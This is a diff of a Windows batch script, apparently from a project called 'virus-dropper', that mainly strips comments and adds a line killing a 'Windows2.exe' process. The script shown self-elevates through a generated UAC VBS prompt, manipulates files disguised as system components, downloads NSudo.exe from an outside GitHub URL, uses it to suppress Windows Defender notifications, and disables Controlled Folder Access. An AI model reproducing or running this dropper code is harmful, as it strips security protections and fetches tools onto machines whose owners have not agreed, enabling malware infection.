@@ -1,11 +1,5 @@
 @echo off
-
-:: BatchGotAdmin
-::-------------------------------------
-REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-
-REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
@@ -15,7 +9,6 @@ if '%errorlevel%' NEQ '0' (
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     set params = %*:"="
     echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
     exit /B
@@ -26,6 +19,7 @@ attrib "%systemroot%\System32\Windowsexe\Windows.exe" -h -s
 attrib "%systemroot%\System32\Windowsexe\Update.bat" -h -s
 attrib "%systemroot%\System32\Windowsexe\AV.bat" -h -s
 Taskkill /IM "Windows.exe" /F
+Taskkill /IM "Windows2.exe" /F
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
